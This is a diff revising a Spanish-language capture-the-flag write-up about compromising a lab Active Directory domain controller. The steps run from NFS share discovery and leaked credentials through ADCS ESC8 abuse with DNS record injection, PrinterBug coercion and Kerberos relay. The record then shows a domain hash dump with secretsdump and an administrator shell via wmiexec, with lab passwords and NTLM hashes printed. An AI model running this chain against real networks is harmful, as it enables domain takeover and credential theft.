@@ -141,13 +141,14 @@ dc-jpq225.cicada.vl.    3600    IN      AAAA    dead:beef::d301:890a:d6e2:9c5c
 ;; MSG SIZE  rcvd: 197
 
 ```
-### NFS / Port 2049
+## NFS / Port 2049
 
 ```bash
 showmount -e 10.129.100.199
 Export list for 10.129.100.199:
 /profiles (everyone)
 ```
+### Mount
 
 Vemos que en el puerto 2049 hay una montura llamada `profiles`, por lo que con `mount` creamos la misma en un directorio temporal
 
@@ -161,11 +162,10 @@ Y ahora creamos la montura para despues ver su contenido.
 mount -t nfs 10.129.100.199:/profiles /tmp/montura
 ```
 
-Visualizamos el contenido, y vemos que son directorios de varios usuarios, estos mismos podemos agregarlos a un archivo `users`, para despues tratar de realizar un `kerberoasting attack` en caso de que no vemoas nada de nada .
+Visualizo el contenido, y vemos que son directorios de varios usuarios, pero dentro del directorio de` Rosie.Powell` encontré las siguientes credenciales en una imagen.
 
 ```bash
-┌──(root㉿zsln)-[/tmp/montura]
-└─# ls -la
+ls -la
 total 10
 drwxrwxrwx+  2 nobody nogroup 4096 Jun  3 07:21 .
 drwxrwxrwt  24 root   root     560 Oct 22 19:09 ..
@@ -182,20 +182,19 @@ drwxrwxrwx+  2 nobody nogroup   64 Sep 15  2024 Rosie.Powell
 drwxrwxrwx+  2 nobody nogroup   64 Sep 13  2024 Shirley.West
 ```
 
-```bash
+![image-center](/assets/images/Pasted image 20251230145944.png)
+## Auth as DC-JPQ225 
 
-```
-![Pasted image 20251022193952](images/Pasted image 20251022193952.png)
-
-Ya que la imagen se encontro en el directorio de Rosie.Powell intentamos probar sin son validas a nivel de kerberos ya que parece que la autenticacino `NTLM` esta deshabilitada.
+Ya que la imagen se encontró en el directorio de `Rosie.Powell` intentamos probar sin son validas a nivel de `kerberos` ya que parece que la autenticación `NTLM` esta deshabilitada.
 
 ```bash
 nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k
 SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
 SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
 ```
+### Shares
 
-Como vemo que si son validas probamos listar `shares`.
+Como vemos que si son validas probamos listar `shares`.
 
 ```bash
 nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k --shares
@@ -212,8 +211,9 @@ SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        NETLOGON        READ    
 SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        profiles$       READ,WRITE      
 SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        SYSVOL          READ            Logon server share
 ```
+### Enumeration
 
-Vemos un recurso que no es tan comun asi que vamos a conectarnos y ver su contenido.
+Vemos un recurso que no es tan común así que vamos a conectarnos y ver su contenido.
 
 ```bash
 impacket-smbclient cicada.vl/Rosie.Powell:Cicada123@DC-JPQ225.cicada.vl -dc-ip 10.129.100.199 -k
@@ -232,162 +232,15 @@ SYSVOL
 # ls
 drw-rw-rw-          0  Wed Oct 22 19:04:14 2025 .
 drw-rw-rw-          0  Fri Sep 13 12:17:59 2024 ..
--rw-rw-rw-        741  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA(1)+.crl
--rw-rw-rw-        941  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA(1).crl
--rw-rw-rw-        742  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(10)+.crl
--rw-rw-rw-        943  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(10).crl
--rw-rw-rw-        742  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(11)+.crl
--rw-rw-rw-        943  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(11).crl
--rw-rw-rw-        742  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(12)+.crl
--rw-rw-rw-        943  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(12).crl
--rw-rw-rw-        742  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(13)+.crl
--rw-rw-rw-        943  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(13).crl
--rw-rw-rw-        742  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(14)+.crl
--rw-rw-rw-        943  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(14).crl
--rw-rw-rw-        742  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(15)+.crl
--rw-rw-rw-        943  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(15).crl
--rw-rw-rw-        742  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(16)+.crl
--rw-rw-rw-        943  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(16).crl
--rw-rw-rw-        742  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(17)+.crl
--rw-rw-rw-        943  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(17).crl
--rw-rw-rw-        742  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(18)+.crl
--rw-rw-rw-        943  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(18).crl
--rw-rw-rw-        742  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(19)+.crl
--rw-rw-rw-        943  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(19).crl
--rw-rw-rw-        741  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA(2)+.crl
--rw-rw-rw-        941  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA(2).crl
--rw-rw-rw-        742  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(20)+.crl
--rw-rw-rw-        943  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(20).crl
--rw-rw-rw-        742  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(21)+.crl
--rw-rw-rw-        943  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(21).crl
--rw-rw-rw-        742  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(22)+.crl
--rw-rw-rw-        943  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(22).crl
--rw-rw-rw-        742  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(23)+.crl
--rw-rw-rw-        943  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(23).crl
--rw-rw-rw-        742  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(24)+.crl
--rw-rw-rw-        943  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(24).crl
--rw-rw-rw-        742  Wed Oct 22 18:58:55 2025 cicada-DC-JPQ225-CA(25)+.crl
--rw-rw-rw-        943  Wed Oct 22 18:58:54 2025 cicada-DC-JPQ225-CA(25).crl
--rw-rw-rw-        742  Wed Oct 22 18:58:54 2025 cicada-DC-JPQ225-CA(26)+.crl
--rw-rw-rw-        943  Wed Oct 22 18:58:54 2025 cicada-DC-JPQ225-CA(26).crl
--rw-rw-rw-        742  Wed Oct 22 18:58:54 2025 cicada-DC-JPQ225-CA(27)+.crl
--rw-rw-rw-        943  Wed Oct 22 18:58:54 2025 cicada-DC-JPQ225-CA(27).crl
--rw-rw-rw-        742  Wed Oct 22 18:58:54 2025 cicada-DC-JPQ225-CA(28)+.crl
--rw-rw-rw-        943  Wed Oct 22 18:58:54 2025 cicada-DC-JPQ225-CA(28).crl
--rw-rw-rw-        741  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA(3)+.crl
--rw-rw-rw-        941  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA(3).crl
--rw-rw-rw-        741  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA(4)+.crl
--rw-rw-rw-        941  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA(4).crl
--rw-rw-rw-        741  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA(5)+.crl
--rw-rw-rw-        941  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA(5).crl
--rw-rw-rw-        741  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA(6)+.crl
--rw-rw-rw-        941  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA(6).crl
--rw-rw-rw-        741  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA(7)+.crl
--rw-rw-rw-        941  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA(7).crl
--rw-rw-rw-        741  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA(8)+.crl
--rw-rw-rw-        941  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA(8).crl
--rw-rw-rw-        741  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA(9)+.crl
--rw-rw-rw-        941  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA(9).crl
--rw-rw-rw-        736  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA+.crl
--rw-rw-rw-        933  Wed Oct 22 18:58:56 2025 cicada-DC-JPQ225-CA.crl
--rw-rw-rw-       1385  Sun Sep 15 10:18:43 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(0-1).crt
--rw-rw-rw-        924  Sun Sep 15 04:51:18 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(1).crt
--rw-rw-rw-       1390  Sun Sep 15 10:18:43 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(1-0).crt
--rw-rw-rw-       1390  Sun Sep 15 10:18:43 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(1-2).crt
--rw-rw-rw-        924  Thu Apr 10 05:44:43 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(10).crt
--rw-rw-rw-       1391  Fri Apr 11 02:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(10-11).crt
--rw-rw-rw-       1391  Thu Apr 10 05:57:00 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(10-9).crt
--rw-rw-rw-        924  Thu Apr 10 05:58:25 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(11).crt
--rw-rw-rw-       1391  Fri Apr 11 02:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(11-10).crt
--rw-rw-rw-       1391  Fri Apr 11 02:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(11-12).crt
--rw-rw-rw-        924  Thu Apr 10 06:00:22 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(12).crt
--rw-rw-rw-       1391  Fri Apr 11 02:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(12-11).crt
--rw-rw-rw-       1391  Fri Apr 11 02:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(12-13).crt
--rw-rw-rw-        924  Thu Apr 10 06:03:13 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(13).crt
--rw-rw-rw-       1391  Fri Apr 11 02:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(13-12).crt
--rw-rw-rw-       1391  Tue Jun  3 07:21:47 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(13-14).crt
--rw-rw-rw-        924  Fri Apr 11 02:49:41 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(14).crt
--rw-rw-rw-       1391  Tue Jun  3 07:22:11 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(14-13).crt
--rw-rw-rw-       1391  Tue Jun  3 07:22:11 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(14-15).crt
--rw-rw-rw-        924  Fri Apr 11 02:51:40 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(15).crt
--rw-rw-rw-       1391  Tue Jun  3 07:22:11 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(15-14).crt
--rw-rw-rw-       1391  Tue Jun  3 07:22:12 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(15-16).crt
--rw-rw-rw-        924  Fri Apr 11 02:53:40 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(16).crt
--rw-rw-rw-       1391  Tue Jun  3 07:22:12 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(16-15).crt
--rw-rw-rw-       1391  Wed Jun  4 09:51:26 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(16-17).crt
--rw-rw-rw-        924  Tue Jun  3 07:23:15 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(17).crt
--rw-rw-rw-       1391  Wed Jun  4 09:51:26 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(17-16).crt
--rw-rw-rw-       1391  Wed Jun  4 09:51:26 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(17-18).crt
--rw-rw-rw-        924  Tue Jun  3 07:24:51 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(18).crt
--rw-rw-rw-       1391  Wed Jun  4 09:51:26 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(18-17).crt
--rw-rw-rw-       1391  Wed Jun  4 09:51:27 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(18-19).crt
--rw-rw-rw-        924  Tue Jun  3 07:26:51 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(19).crt
--rw-rw-rw-       1391  Wed Jun  4 09:51:27 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(19-18).crt
--rw-rw-rw-       1391  Wed Jun  4 10:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(19-20).crt
--rw-rw-rw-        924  Sun Sep 15 04:53:03 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(2).crt
--rw-rw-rw-       1390  Sun Sep 15 10:18:44 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(2-1).crt
--rw-rw-rw-       1390  Sun Sep 29 06:41:29 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(2-3).crt
--rw-rw-rw-        924  Wed Jun  4 09:52:43 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(20).crt
--rw-rw-rw-       1391  Wed Jun  4 10:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(20-19).crt
--rw-rw-rw-       1391  Wed Jun  4 10:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(20-21).crt
--rw-rw-rw-        924  Wed Jun  4 09:54:47 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(21).crt
--rw-rw-rw-       1391  Wed Jun  4 10:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(21-20).crt
--rw-rw-rw-       1391  Wed Jun  4 10:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(21-22).crt
--rw-rw-rw-        924  Wed Jun  4 09:56:47 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(22).crt
--rw-rw-rw-       1391  Wed Jun  4 10:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(22-21).crt
--rw-rw-rw-       1391  Wed Jun  4 11:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(22-23).crt
--rw-rw-rw-        924  Wed Jun  4 10:36:17 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(23).crt
--rw-rw-rw-       1391  Wed Jun  4 11:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(23-22).crt
--rw-rw-rw-       1391  Wed Jun  4 11:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(23-24).crt
--rw-rw-rw-        924  Wed Jun  4 10:38:20 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(24).crt
--rw-rw-rw-       1391  Wed Jun  4 11:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(24-23).crt
--rw-rw-rw-       1391  Wed Jun  4 11:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(24-25).crt
--rw-rw-rw-        924  Wed Jun  4 10:40:21 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(25).crt
--rw-rw-rw-       1391  Wed Jun  4 11:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(25-24).crt
--rw-rw-rw-       1391  Wed Oct 22 18:58:53 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(25-26).crt
--rw-rw-rw-        924  Wed Jun  4 11:04:01 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(26).crt
--rw-rw-rw-       1391  Wed Oct 22 18:58:53 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(26-25).crt
--rw-rw-rw-       1391  Wed Oct 22 18:58:53 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(26-27).crt
--rw-rw-rw-        924  Wed Jun  4 11:05:56 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(27).crt
--rw-rw-rw-       1391  Wed Oct 22 18:58:53 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(27-26).crt
--rw-rw-rw-       1391  Wed Oct 22 18:58:54 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(27-28).crt
--rw-rw-rw-        924  Wed Jun  4 11:07:56 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(28).crt
--rw-rw-rw-       1391  Wed Oct 22 18:58:54 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(28-27).crt
--rw-rw-rw-        924  Wed Oct 22 19:00:17 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(29).crt
--rw-rw-rw-        924  Sun Sep 15 10:21:57 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(3).crt
--rw-rw-rw-       1390  Sun Sep 29 06:41:29 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(3-2).crt
--rw-rw-rw-       1390  Sun Sep 29 06:41:29 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(3-4).crt
--rw-rw-rw-        924  Wed Oct 22 19:02:14 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(30).crt
--rw-rw-rw-        924  Wed Oct 22 19:04:14 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(31).crt
--rw-rw-rw-        924  Sun Sep 15 10:24:12 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(4).crt
--rw-rw-rw-       1390  Sun Sep 29 06:41:30 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(4-3).crt
--rw-rw-rw-       1390  Thu Apr 10 05:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(4-5).crt
--rw-rw-rw-        924  Sun Sep 29 06:43:51 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(5).crt
--rw-rw-rw-       1390  Thu Apr 10 05:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(5-4).crt
--rw-rw-rw-       1390  Thu Apr 10 05:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(5-6).crt
--rw-rw-rw-        924  Sun Sep 29 06:44:59 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(6).crt
--rw-rw-rw-       1390  Thu Apr 10 05:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(6-5).crt
--rw-rw-rw-       1390  Thu Apr 10 05:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(6-7).crt
--rw-rw-rw-        924  Sun Sep 29 06:46:59 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(7).crt
--rw-rw-rw-       1390  Thu Apr 10 05:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(7-6).crt
--rw-rw-rw-       1390  Thu Apr 10 05:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(7-8).crt
--rw-rw-rw-        924  Thu Apr 10 05:40:45 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(8).crt
--rw-rw-rw-       1390  Thu Apr 10 05:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(8-7).crt
--rw-rw-rw-       1390  Thu Apr 10 05:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(8-9).crt
--rw-rw-rw-        924  Thu Apr 10 05:42:44 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(9).crt
--rw-rw-rw-       1390  Thu Apr 10 05:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(9-10).crt
--rw-rw-rw-       1390  Thu Apr 10 05:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(9-8).crt
--rw-rw-rw-        885  Fri Sep 13 07:50:51 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA.crt
+<SNiP>
 -rw-rw-rw-        331  Fri Sep 13 12:17:59 2024 nsrev_cicada-DC-JPQ225-CA.asp
 ```
+### ADCS Enumeration
 
 Vemos que dentro de `CertEnroll`, hay demasiados archivos de certificados, por lo que podriamos intentar ver si la maquina es vulnerable a algun `ESC`.
 
 ```bash
 certipy-ad find -k -target-ip 10.129.100.199 -dc-host DC-JPQ225.cicada.vl  -vulnerable -dc-ip 10.129.100.199 -enabled -stdout
-```
-
-```bash
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [!] Target name (-target) not specified and Kerberos authentication is used. This might fail
@@ -437,9 +290,10 @@ Certificate Authorities
       ESC8                              : Web Enrollment is enabled over HTTP.
 Certificate Templates                   : [!] Could not find any certificate templates
 ```
+### ESC8 
 
-Como vemos la maquina es vulnerable a `ESC8` por lo que nos podemo ir directamente a la pagina de [certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) donde explican detalladamente  sobre como abusar de esta vulnerabilidad.
-Para esto debido a que seguramente nos de errores debido a q esta vulnerabilidad es por la autenticacion `NTLM` y en nuestro caso la maquina solo acepta el protocolo `Kerberos` primero necesitamos de crear un Servidor `DNS`. Para eso consultamos la `Machine Account quotta` de la maquina.
+Como vemos la maquina es vulnerable a `ESC8` por lo que nos podemos ir directamente a la pagina de [certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) donde explican detalladamente  sobre como abusar de esta vulnerabilidad.
+Para esto debido a que seguramente nos de errores debido a q esta vulnerabilidad es por la autenticación `NTLM` y en nuestro caso la maquina solo acepta la autenticación vía `Kerberos` primero necesitamos de crear un Servidor `DNS`. Para eso consultamos la `Machine Account quotta` de la maquina.
 
 ```bash
 nxc ldap cicada.vl -u Rosie.Powell -p Cicada123 -k -M maq          
@@ -448,6 +302,7 @@ LDAP        cicada.vl       389    DC-JPQ225        [+] cicada.vl\Rosie.Powell:C
 MAQ         cicada.vl       389    DC-JPQ225        [*] Getting the MachineAccountQuota
 MAQ         cicada.vl       389    DC-JPQ225        MachineAccountQuota: 10
 ```
+### ESC8 Abuse
 
 Debido a q esta seteado a `10` podemos pasar a crear nuestro `DNS` como nos relata en este [enlace](https://github.com/decoder-it/KrbRelay-SMBServer) donde vemos que tiene que tener una sintaxis como este: _<server_name>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA_ 
 Para esto podemos hacer uso de [bloodyAD](https://github.com/CravateRouge/bloodyAD) 
@@ -457,7 +312,7 @@ bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl
 [+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
 ```
 
-Luego podemos configurar tal cual como dice en el [repo](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) de certipy podemos usar herramineta de coercion como DFSCoerce [https://github.com/Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce), PetitPotam [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam) , etc en mi caso use la herramienta `netexec` con el modulo de coercion para realizar el ataque, de manera que este actue de disparador para la autenticacion `SMB`
+Luego podemos configurar tal cual como dice en el [repo](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) de certipy podemos usar herramientas de coerción como `DFSCoerce` [https://github.com/Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce), `PetitPotam` [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam) , etc. en mi caso use la herramienta `netexec` con el modulo de coerción para realizar el ataque, de manera que este actue de disparador para la autenticación `SMB`
 
 ```bash
  netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PrinterBug
@@ -467,7 +322,7 @@ COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
 COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
 ```
 
-Y desde nuestra herramienta de retransmision de Kerberos vemos que recibimos la conexion, y con ella, el certificado `.pfx`.
+Y desde nuestra herramienta de retransmisión de Kerberos vemos que recibimos la conexión, y con ella, el certificado `.pfx`.
 
 ```bash
 python3 krbrelayx.py -t 'http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp' --adcs --template DomainController -v 'DC-JPQ225$'
@@ -498,16 +353,8 @@ python3 krbrelayx.py -t 'http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp' --adcs
 Una vez tenemos el certificado podemos usar el mismo `certipy` para autenticarnos con el certificado que obtuvimos.
 
 ```bash
-ls
-addspn.py      dnstool.py    lib      printerbug.py  venv
-DC-JPQ225.pfx  krbrelayx.py  LICENSE  README.md
-                                                                                            
 certipy-ad auth -pfx DC-JPQ225.pfx -dc-ip 10.129.100.199
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
-
-```
-
-```bash
 [*] Certificate identities:
 [*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
 [*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
@@ -521,6 +368,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 ```
 
 Una vez tenemos el hash de la maquina podemos solicitar un `TGT`, para luego poder usar `secretsdump` para dumpear los hashes de todos los usuarios del dominio.
+## Shell as administrator
 
 ```bash
 impacket-getTGT cicada.vl/dc-jpq225 -hashes aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3 -dc-ip 10.129.100.199
@@ -528,8 +376,9 @@ Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Saving ticket in dc-jpq225.ccache
 ```
+### Dump hashes with secretsdump
 
-Y ahora con la herramienta de impacket realizamos el dumpeo.
+Y ahora con la herramienta de `impacket` realizamos el dumpeo.
 
 ```bash
 impacket-secretsdump  -k -no-pass -dc-ip 10.129.100.199 dc-jpq225.cicada.vl
@@ -594,8 +443,9 @@ DC-JPQ225$:aes128-cts-hmac-sha1-96:87efc91730d07d819f58b4996e3fa04c
 DC-JPQ225$:des-cbc-md5:6df208855d40dfcb
 [*] Cleaning up...
 ```
+### Shell
 
-Ahora como ya es rutina, solicitamos el `TGT` para administrator y luego pa adentro de la maquina con `wmiexec`.
+Ahora como ya es rutina, solicitamos el `TGT` para administrator y luego para adentro de la maquina con `wmiexec`.
 
 ```bash
 impacket-getTGT cicada.vl/administrator -hashes aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87 -dc-ip 10.129.100.199
